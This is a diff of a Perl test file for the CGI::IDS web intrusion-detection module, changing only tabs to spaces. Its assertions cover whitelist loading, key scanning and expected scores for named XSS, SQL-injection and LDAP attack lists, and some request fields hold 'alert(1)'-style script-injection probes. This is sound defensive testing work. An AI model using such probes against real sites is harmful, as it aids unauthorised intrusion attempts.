 like( $@, qr/No IDS filter rules loaded/, 'Croak if filter file loading failed in other cases' );
 
 eval {
-	my $ids = new CGI::IDS(
-		whitelist_file	=> "$Bin/data/missing_param_whitelist.xml",
-	);
+    my $ids = new CGI::IDS(
+        whitelist_file  => "$Bin/data/missing_param_whitelist.xml",
+    );
 };
 like( $@, qr/_load_whitelist_from_xml.*File does not exist/, 'Croak if whitelist file is missing' );
 
 eval {
-	my $ids = new CGI::IDS(
-		whitelist_file	=> "$Bin/data/test_param_whitelist_bad_xml.xml",
-	);
+    my $ids = new CGI::IDS(
+        whitelist_file  => "$Bin/data/test_param_whitelist_bad_xml.xml",
+    );
 };
 like( $@, qr/(?:Error in _load_whitelist_from_xml while parsing)(?!.*(?:File does not exist))/, 'Croak if whitelist file has incorrect XML');
 
 eval {
-	my $ids = new CGI::IDS(
-		whitelist_file	=> "$Bin/data/test_param_whitelist_bad_regex.xml",
-	);
+    my $ids = new CGI::IDS(
+        whitelist_file  => "$Bin/data/test_param_whitelist_bad_regex.xml",
+    );
 };
 like( $@, qr/Error in whitelist rule/, 'Croak if whitelist file contains incorrect RegEx' );
 
 # instantiate IDS for detection tests
 print testmessage("instantiate IDS for detection tests");
 my $ids = new CGI::IDS(
-	whitelist_file	=> "$Bin/data/test_param_whitelist.xml",
+    whitelist_file  => "$Bin/data/test_param_whitelist.xml",
 );
 isa_ok ($ids, 'CGI::IDS');
 
@@ -1015,116 +1015,116 @@ isa_ok ($ids, 'CGI::IDS');
 print testmessage("test get_attacks()");
 ok (!$ids->get_attacks(), 'No attack found if no detection run');
 $ids->detect_attacks(request => \%testSimpleScan);
-isa_ok ($ids->get_attacks(),												'ARRAY',	'The return value of get_attacks()');
+isa_ok ($ids->get_attacks(),                                                'ARRAY',    'The return value of get_attacks()');
 
 my $attacks = $ids->get_attacks();
 ok ($attacks, 'Attacks returned in get_attacks()');
-is ($attacks->[0]->{impact},												8,			'Correct impact returned by get_attacks()');
+is ($attacks->[0]->{impact},                                                8,          'Correct impact returned by get_attacks()');
 
 # test key scanning
 print testmessage("test key scanning");
-is ($ids->detect_attacks(request => \%testScanKeys),						16,			"testScanKeys default (off)");
+is ($ids->detect_attacks(request => \%testScanKeys),                        16,         "testScanKeys default (off)");
 
 $ids->set_scan_keys(scan_keys => 1);
-is ($ids->detect_attacks(request => \%testScanKeys),						32,			"testScanKeys set on");
+is ($ids->detect_attacks(request => \%testScanKeys),                        32,         "testScanKeys set on");
 
 $ids->set_scan_keys(scan_keys => 0);
-is ($ids->detect_attacks(request => \%testScanKeys),						16,			"testScanKeys set off");
+is ($ids->detect_attacks(request => \%testScanKeys),                        16,         "testScanKeys set off");
 
 $ids->set_scan_keys(scan_keys => 1);
 $ids->set_scan_keys();
-is ($ids->detect_attacks(request => \%testScanKeys),						16,			"testScanKeys set from 1 to default (off)");
+is ($ids->detect_attacks(request => \%testScanKeys),                        16,         "testScanKeys set from 1 to default (off)");
 
 # test whitelist
 print testmessage("test whitelist");
-is ($ids->detect_attacks(request => \%testWhitelistScan),					8,			"testWhitelistScan");
-is ($ids->detect_attacks(request => \%testWhitelistScan2),					8,			"testWhitelistScan2");
-is ($ids->detect_attacks(request => \%testWhitelistScan3),					8,			"testWhitelistScan3");
-is ($ids->detect_attacks(request => \%testWhitelistScan4),					16,			"testWhitelistScan4");
-is ($ids->detect_attacks(request => \%testWhitelistScan5),					8,			"testWhitelistScan5");
-is ($ids->detect_attacks(request => \%testWhitelistSkip),					0,			"testWhitelistSkip");
-is ($ids->detect_attacks(request => \%testWhitelistSkip2),					8,			"testWhitelistSkip2");
-is ($ids->detect_attacks(request => \%testWhitelistSkip3),					8,			"testWhitelistSkip3");
+is ($ids->detect_attacks(request => \%testWhitelistScan),                   8,          "testWhitelistScan");
+is ($ids->detect_attacks(request => \%testWhitelistScan2),                  8,          "testWhitelistScan2");
+is ($ids->detect_attacks(request => \%testWhitelistScan3),                  8,          "testWhitelistScan3");
+is ($ids->detect_attacks(request => \%testWhitelistScan4),                  16,         "testWhitelistScan4");
+is ($ids->detect_attacks(request => \%testWhitelistScan5),                  8,          "testWhitelistScan5");
+is ($ids->detect_attacks(request => \%testWhitelistSkip),                   0,          "testWhitelistSkip");
+is ($ids->detect_attacks(request => \%testWhitelistSkip2),                  8,          "testWhitelistSkip2");
+is ($ids->detect_attacks(request => \%testWhitelistSkip3),                  8,          "testWhitelistSkip3");
 
 # test converters and filters
 print testmessage("test converters and filters");
-is ($ids->detect_attacks(request => \%testAttributeBreakerList),			29,			"testAttributeBreakerList");
-is ($ids->detect_attacks(request => \%testCommentList),						9,			"testCommentList");
-is ($ids->detect_attacks(request => \%testConcatenatedXSSList),				1126,		"testConcatenatedXSSList");
-is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),			1047,		"testConcatenatedXSSList2");
-is ($ids->detect_attacks(request => \%testXMLPredicateXSSList),				148,		"testXMLPredicateXSSList");
-is ($ids->detect_attacks(request => \%testConditionalCompilationXSSList),	87,			"testXMLPredicateXSSList");
-is ($ids->detect_attacks(request => \%testXSSList),							784,		"testXSSList");
-is ($ids->detect_attacks(request => \%testSelfContainedXSSList),			530,		"testSelfContainedXSSList");
-is ($ids->detect_attacks(request => \%testSQLIList),						464,		"testSQLIList");
-is ($ids->detect_attacks(request => \%testSQLIList2),						634,		"testSQLIList2");
-is ($ids->detect_attacks(request => \%testSQLIList3),						591,		"testSQLIList3");
-is ($ids->detect_attacks(request => \%testSQLIList4),						853,		"testSQLIList4");
-is ($ids->detect_attacks(request => \%testSQLIList5),						928,		"testSQLIList5");
-is ($ids->detect_attacks(request => \%testSQLIList6),						546,		"testSQLIList6");
-is ($ids->detect_attacks(request => \%testDTList),							126,		"testDTList");
-is ($ids->detect_attacks(request => \%testURIList),							143,		"testURIList");
-is ($ids->detect_attacks(request => \%testRFEList),							524,		"testRFEList");
-is ($ids->detect_attacks(request => \%testUTF7List),						71,			"testUTF7List");
-is ($ids->detect_attacks(request => \%testBase64CCConverter),				151,		"testBase64CCConverter");
-is ($ids->detect_attacks(request => \%testDecimalCCConverter),				72,			"testDecimalCCConverter");
-is ($ids->detect_attacks(request => \%testOctalCCConverter),				48,			"testOctalCCConverter");
-is ($ids->detect_attacks(request => \%testHexCCConverter),					109,    	"testHexCCConverter");
-is ($ids->detect_attacks(request => \%testLDAPInjectionList),				20,			"testLDAPInjectionList");
-is ($ids->detect_attacks(request => \%testJSONScanning),					32,			"testJSONScanning");
-is ($ids->detect_attacks(request => \%testForFalseAlerts),					0,			"testForFalseAlerts");
+is ($ids->detect_attacks(request => \%testAttributeBreakerList),            29,         "testAttributeBreakerList");
+is ($ids->detect_attacks(request => \%testCommentList),                     9,          "testCommentList");
+is ($ids->detect_attacks(request => \%testConcatenatedXSSList),             1126,       "testConcatenatedXSSList");
+is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),            1047,       "testConcatenatedXSSList2");
+is ($ids->detect_attacks(request => \%testXMLPredicateXSSList),             148,        "testXMLPredicateXSSList");
+is ($ids->detect_attacks(request => \%testConditionalCompilationXSSList),   87,         "testXMLPredicateXSSList");
+is ($ids->detect_attacks(request => \%testXSSList),                         784,        "testXSSList");
+is ($ids->detect_attacks(request => \%testSelfContainedXSSList),            530,        "testSelfContainedXSSList");
+is ($ids->detect_attacks(request => \%testSQLIList),                        464,        "testSQLIList");
+is ($ids->detect_attacks(request => \%testSQLIList2),                       634,        "testSQLIList2");
+is ($ids->detect_attacks(request => \%testSQLIList3),                       591,        "testSQLIList3");
+is ($ids->detect_attacks(request => \%testSQLIList4),                       853,        "testSQLIList4");
+is ($ids->detect_attacks(request => \%testSQLIList5),                       928,        "testSQLIList5");
+is ($ids->detect_attacks(request => \%testSQLIList6),                       546,        "testSQLIList6");
+is ($ids->detect_attacks(request => \%testDTList),                          126,        "testDTList");
+is ($ids->detect_attacks(request => \%testURIList),                         143,        "testURIList");
+is ($ids->detect_attacks(request => \%testRFEList),                         524,        "testRFEList");
+is ($ids->detect_attacks(request => \%testUTF7List),                        71,         "testUTF7List");
+is ($ids->detect_attacks(request => \%testBase64CCConverter),               151,        "testBase64CCConverter");
+is ($ids->detect_attacks(request => \%testDecimalCCConverter),              72,         "testDecimalCCConverter");
+is ($ids->detect_attacks(request => \%testOctalCCConverter),                48,         "testOctalCCConverter");
+is ($ids->detect_attacks(request => \%testHexCCConverter),                  109,        "testHexCCConverter");
+is ($ids->detect_attacks(request => \%testLDAPInjectionList),               20,         "testLDAPInjectionList");
+is ($ids->detect_attacks(request => \%testJSONScanning),                    32,         "testJSONScanning");
+is ($ids->detect_attacks(request => \%testForFalseAlerts),                  0,          "testForFalseAlerts");
 
 #------------------------- CGI::IDS::Whitelist Tests -----------------------------------------------
 print testmessage("Whitelist Processor tests");
 
 eval {
-	my $whitelist_fail = new CGI::IDS::Whitelist(
-		whitelist_file	=> "$Bin/data/missing_param_whitelist.xml",
-	);
+    my $whitelist_fail = new CGI::IDS::Whitelist(
+        whitelist_file  => "$Bin/data/missing_param_whitelist.xml",
+    );
 };
 like( $@, qr/_load_whitelist_from_xml.*File does not exist/, 'Croak if whitelist file is missing' );
 
 my $whitelist = new CGI::IDS::Whitelist (
-	whitelist_file	=> "$Bin/data/test_param_whitelist.xml",
+    whitelist_file  => "$Bin/data/test_param_whitelist.xml",
 );
 isa_ok ($whitelist, 'CGI::IDS::Whitelist');
 
 
 my %testWhitelist = (
-	login_password	=>	'alert(1)',
-	name			=>	'hinnerk',
-	lastname		=>	'hinnerk alert(2)',
-	action			=>	'login',
-	username		=>	'hinnerk',
-	scr_rec_id		=>	'8763476.946ef987',
-	send			=>	'',
-	uid				=>	'alert(1)',
-	cert			=>	'alert(1)',
+    login_password  =>  'alert(1)',
+    name            =>  'hinnerk',
+    lastname        =>  'hinnerk alert(2)',
+    action          =>  'login',
+    username        =>  'hinnerk',
+    scr_rec_id      =>  '8763476.946ef987',
+    send            =>  '',
+    uid             =>  'alert(1)',
+    cert            =>  'alert(1)',
 );
-ok (!$whitelist->is_suspicious(key => 'login_password', request => \%testWhitelist),	"login_password whitelisted as per rule and conditions");
-ok ( $whitelist->is_suspicious(key => 'lastname', request => \%testWhitelist),			"login_password is suspicious");
-ok (!$whitelist->is_suspicious(key => 'name', request => \%testWhitelist),				"name is not suspicious");
-ok (!$whitelist->is_suspicious(key => 'uid', request => \%testWhitelist),				"uid is generally whitelisted");
-ok (!$whitelist->is_suspicious(key => 'scr_rec_id', request => \%testWhitelist),		"scr_rec_id is whitelisted as per rule");
-ok ( $whitelist->is_suspicious(key => 'cert', request => \%testWhitelist),				"cert is not whitelisted due to failing conditions");
+ok (!$whitelist->is_suspicious(key => 'login_password', request => \%testWhitelist),    "login_password whitelisted as per rule and conditions");
+ok ( $whitelist->is_suspicious(key => 'lastname', request => \%testWhitelist),          "login_password is suspicious");
+ok (!$whitelist->is_suspicious(key => 'name', request => \%testWhitelist),              "name is not suspicious");
+ok (!$whitelist->is_suspicious(key => 'uid', request => \%testWhitelist),               "uid is generally whitelisted");
+ok (!$whitelist->is_suspicious(key => 'scr_rec_id', request => \%testWhitelist),        "scr_rec_id is whitelisted as per rule");
+ok ( $whitelist->is_suspicious(key => 'cert', request => \%testWhitelist),              "cert is not whitelisted due to failing conditions");
 
-ok ( $whitelist->is_harmless_string("hinnerk"),											"'hinnerk' is a harmless string");
-ok (!$whitelist->is_harmless_string("hinnerk(1)"),										"'hinnerk(1)' is not a harmless string");
+ok ( $whitelist->is_harmless_string("hinnerk"),                                         "'hinnerk' is a harmless string");
+ok (!$whitelist->is_harmless_string("hinnerk(1)"),                                      "'hinnerk(1)' is not a harmless string");
 
-ok ( (grep {$_->{key} eq 'lastname'} @{$whitelist->suspicious_keys()}),					"'lastname' is in suspicious_keys list");
-ok (!(grep {$_->{key} eq 'name'}     @{$whitelist->suspicious_keys()}),					"'name' is not in suspicious_keys list");
-ok (!(grep {$_->{key} eq 'lastname'} @{$whitelist->non_suspicious_keys()}),				"'lastname' is not in non_suspicious_keys list");
-ok ( (grep {$_->{key} eq 'name'}     @{$whitelist->non_suspicious_keys()}),				"'name' is in non_suspicious_keys list");
+ok ( (grep {$_->{key} eq 'lastname'} @{$whitelist->suspicious_keys()}),                 "'lastname' is in suspicious_keys list");
+ok (!(grep {$_->{key} eq 'name'}     @{$whitelist->suspicious_keys()}),                 "'name' is not in suspicious_keys list");
+ok (!(grep {$_->{key} eq 'lastname'} @{$whitelist->non_suspicious_keys()}),             "'lastname' is not in non_suspicious_keys list");
+ok ( (grep {$_->{key} eq 'name'}     @{$whitelist->non_suspicious_keys()}),             "'name' is in non_suspicious_keys list");
 
 $whitelist->reset();
-ok (!(grep {$_->{key} eq 'lastname'} @{$whitelist->suspicious_keys()}),					"'lastname' is not in suspicious_keys list after reset");
-ok (!(grep {$_->{key} eq 'name'}     @{$whitelist->suspicious_keys()}),					"'name' is not in suspicious_keys list after reset");
-ok (!(grep {$_->{key} eq 'lastname'} @{$whitelist->non_suspicious_keys()}),				"'lastname' is not in non_suspicious_keys list after reset");
-ok (!(grep {$_->{key} eq 'name'}     @{$whitelist->non_suspicious_keys()}),				"'name' is not in non_suspicious_keys list after reset");
+ok (!(grep {$_->{key} eq 'lastname'} @{$whitelist->suspicious_keys()}),                 "'lastname' is not in suspicious_keys list after reset");
+ok (!(grep {$_->{key} eq 'name'}     @{$whitelist->suspicious_keys()}),                 "'name' is not in suspicious_keys list after reset");
+ok (!(grep {$_->{key} eq 'lastname'} @{$whitelist->non_suspicious_keys()}),             "'lastname' is not in non_suspicious_keys list after reset");
+ok (!(grep {$_->{key} eq 'name'}     @{$whitelist->non_suspicious_keys()}),             "'name' is not in non_suspicious_keys list after reset");
 
 like ($whitelist->convert_if_marked_encoded( key => 'json_value', value => '{"a":"b","c":["123", 111, "456"]}' ), qr/^[a-c1-6\n]+$/, 'param marked as JSON has been converted');
 
 sub testmessage {
-	(my $message) = @_;
-	return "\n-- $message\n";
+    (my $message) = @_;
+    return "\n-- $message\n";
 }
